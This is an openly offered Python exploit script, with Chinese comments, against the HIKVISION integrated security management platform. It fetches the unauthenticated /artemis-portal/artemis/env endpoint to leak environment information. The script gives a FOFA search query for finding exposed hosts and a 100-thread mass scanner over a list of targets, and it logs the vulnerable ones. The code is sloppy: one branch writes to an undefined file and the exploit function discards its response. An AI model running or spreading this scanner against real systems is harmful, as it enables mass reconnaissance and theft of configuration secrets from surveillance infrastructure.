#HiKVISION综合安防管理平台env信息泄漏
#api /artemis-portal/artemis/env
#fofa
body="/portal/skin/isee/redblack/"
# /coremail/common/assets/;l;/;/;/;/;/s?biz=Mzl3MTk4NTcyNw==&mid=2247485877&idx=1&sn=7e5f77db320ccf9013c0b7aa72626e68&chksm=eb3834e5dc4fbdf3a9529734de7e6958e1b7efabecd1c1b340c53c80299ff5c688bf6adaed61&scene=2
#导包
import requests,re,json,argparse,sys,time,os
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """  _    _ _ _  ____      _______  _____ _____ ____  _   _ 
 | |  | (_) |/ /\ \    / /_   _|/ ____|_   _/ __ \| \ | |
 | |__| |_| ' /  \ \  / /  | | | (___   | || |  | |  \| |
 |  __  | |  <    \ \/ /   | |  \___ \  | || |  | | . ` |
 | |  | | | . \    \  /   _| |_ ____) |_| || |__| | |\  |
 |_|  |_|_|_|\_\    \/   |_____|_____/|_____\____/|_| \_|
                                                         
                                                         
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="HiKVISION综合安防管理平台env信息泄漏")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    payload = '/artemis-portal/artemis/env'
    headers = {
        'Sec-Ch-Ua':'"Not/A)Brand";v="8","Chromium";v="126","GoogleChrome";v="126"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Priority':'u=0,i',
        'Connection':'close',
            }
    try:
        res = requests.get(url=target + payload,verify=False,headers=headers)
        #print(res.status_code)
        if res.status_code == 200:
            with open('result1.txt','a',encoding='utf -8') as f:
                f.write(f'[+]{target}存在漏洞 \n')
                print(f'[+]{target}存在漏洞 \n')
                return True
        else:
            f.write(f'[-]{target}不存在漏洞 \n')
    except:
        pass
def exp(target):
    time.sleep(2)
    os.system("cls")
    yurl = input('输入你的网址:(q-->quit)\n>>>')
    if yurl == 'q':
        exit()
    url = target + '/artemis-portal/artemis/env'
    headers = {
         'Sec-Ch-Ua':'"Not/A)Brand";v="8","Chromium";v="126","GoogleChrome";v="126"',
        'Sec-Ch-Ua-Mobile':'?0',
        'Sec-Ch-Ua-Platform':'"Windows"',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/126.0.0.0Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site':'none',
        'Sec-Fetch-Mode':'navigate',
        'Sec-Fetch-User':'?1',
        'Sec-Fetch-Dest':'document',
        'Accept-Encoding':'gzip,deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Priority':'u=0,i',
        'Connection':'close',

    }
    res1 = requests.get(url=url,verify=False,headers=headers)


    

    
    
#函数入口
if __name__ == '__main__':
    main()
